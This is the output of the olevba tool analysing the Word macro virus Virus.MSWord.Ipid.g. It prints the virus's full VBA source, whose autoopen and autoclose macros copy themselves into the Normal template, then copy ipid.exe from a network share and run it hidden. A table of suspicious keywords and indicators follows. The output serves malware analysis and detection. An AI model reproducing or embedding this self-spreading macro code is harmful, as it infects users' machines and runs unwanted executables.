olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ipid.g-57de172179769a4448e675b595eda7cfb41301e7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ipid.g-57de172179769a4448e675b595eda7cfb41301e7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Ipid.g-57de172179769a4448e675b595eda7cfb41301e7 - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoopen()
On Error Resume Next 'normal.dot plc
w1 = Application.VBE.Windows.count
For i = 1 To w1
Application.VBE.Windows(i).Visible = True
Next
i = 0
For Each b In Application.VBE.CommandBars
i = i + 1
Application.VBE.CommandBars(i).Protection = msoBarNoCustomize
Application.VBE.CommandBars(i).Enabled = True
Next
p1 = "\\esm-cpd\e$\ipid.exe"
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
Options.VirusProtection = True
CommandBars(33).Controls("exibir").Controls("barras de ferramentas").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("opções...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("personalizar...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("macros...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("Editor do Visual Basic").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Enabled = True
i = 0
For Each b In CommandBars
i = i + 1
If (b.NameLocal = "Barra de menus") Or (b.NameLocal = "Padrão") Or (b.NameLocal = "Formatação") Then
CommandBars(i).Protection = msoBarNoCustomize
Else
CommandBars(i).Enabled = True
End If
Next
c1 = Documents.count
If c1 >= 1 Then
   e1 = ActiveDocument.VBProject.VBComponents.count
   If e1 >= 1 Then
      e2 = ActiveDocument.VBProject.VBComponents.Item(1).Name
      If e1 >= 2 Then
          e3 = ActiveDocument.VBProject.VBComponents.Item(2).Name
          c2 = MacroContainer
          If c2 = ActiveDocument.Name Then
             d1 = ActiveDocument.FullName
             d2 = ActiveDocument.AttachedTemplate.FullName
             d4 = "NewMacros"
             e5 = NormalTemplate.VBProject.VBComponents.count
             If e5 >= 1 Then
                  e6 = NormalTemplate.VBProject.VBComponents.Item(1).Name
                  If e5 >= 2 Then
                         e7 = NormalTemplate.VBProject.VBComponents.Item(2).Name
                         Application.OrganizerDelete d2, e7, wdOrganizerObjectProjectItems
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                         Application.NormalTemplate.Save
                         FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                         End
                   End If 'rodando no ativo sem modulo no nrmal
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                        Application.NormalTemplate.Save
                        FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                        End
              End If
           End If 'rodando no normal.dot
            d1 = ActiveDocument.FullName
            d2 = ActiveDocument.AttachedTemplate.FullName
            d4 = "NewMacros"
            Application.OrganizerDelete d1, e3, wdOrganizerObjectProjectItems
            Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
            Application.NormalTemplate.Save
            FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
            End
       End If 'rodando no normal sem modulo no proj
          d1 = ActiveDocument.FullName
          d2 = ActiveDocument.AttachedTemplate.FullName
          d4 = "NewMacros"
          Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
          Application.NormalTemplate.Save
          FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
          End
End If
End If
End Sub

Sub autoclose()
On Error Resume Next
w1 = Application.VBE.Windows.count
For i = 1 To w1
Application.VBE.Windows(i).Visible = True
Next
i = 0
For Each b In Application.VBE.CommandBars
i = i + 1
Application.VBE.CommandBars(i).Protection = msoBarNoCustomize
Application.VBE.CommandBars(i).Enabled = True
Next
p1 = "\\esm-cpd\e$\ipid.exe"
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
Options.VirusProtection = True
CommandBars(33).Controls("exibir").Controls("barras de ferramentas").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("opções...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("personalizar...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("macros...").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Controls("Editor do Visual Basic").Enabled = True
CommandBars(33).Controls("Ferramentas").Controls("Macro").Enabled = True
i = 0
For Each b In CommandBars
i = i + 1
If (b.NameLocal = "Barra de menus") Or (b.NameLocal = "Padrão") Or (b.NameLocal = "Formatação") Then
CommandBars(i).Protection = msoBarNoCustomize
Else
CommandBars(i).Enabled = True
End If
Next
c1 = Documents.count
If c1 >= 1 Then
   e1 = ActiveDocument.VBProject.VBComponents.count
   If e1 >= 1 Then
      e2 = ActiveDocument.VBProject.VBComponents.Item(1).Name
      If e1 >= 2 Then
          e3 = ActiveDocument.VBProject.VBComponents.Item(2).Name
          c2 = MacroContainer
          If c2 = ActiveDocument.Name Then
             d1 = ActiveDocument.FullName
             d2 = ActiveDocument.AttachedTemplate.FullName
             d4 = "NewMacros"
             e5 = NormalTemplate.VBProject.VBComponents.count
             If e5 >= 1 Then
                  e6 = NormalTemplate.VBProject.VBComponents.Item(1).Name
                  If e5 >= 2 Then
                         e7 = NormalTemplate.VBProject.VBComponents.Item(2).Name
                         Application.OrganizerDelete d2, e7, wdOrganizerObjectProjectItems
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                         Application.NormalTemplate.Save
                         FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                         End
                   End If 'rodando no ativo sem modulo no nrmal
                         d2 = ActiveDocument.AttachedTemplate.FullName
                         d4 = "NewMacros"
                         Application.OrganizerCopy d1, d2, d4, wdOrganizerObjectProjectItems
                        Application.NormalTemplate.Save
                        FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
                        End
              End If
           End If 'rodando no normal.dot
            d1 = ActiveDocument.FullName
            d2 = ActiveDocument.AttachedTemplate.FullName
            d4 = "NewMacros"
            Application.OrganizerDelete d1, e3, wdOrganizerObjectProjectItems
            Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
            Application.NormalTemplate.Save
            FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
            End
       End If 'rodando no normal sem modulo no proj
          d1 = ActiveDocument.FullName
          d2 = ActiveDocument.AttachedTemplate.FullName
          d4 = "NewMacros"
          Application.OrganizerCopy d2, d1, d4, wdOrganizerObjectProjectItems
          Application.NormalTemplate.Save
          FileCopy p1, "c:\windows\ipid.exe"
                        Shell "c:\windows\ipid.exe", 0
          End
End If
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |ipid.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

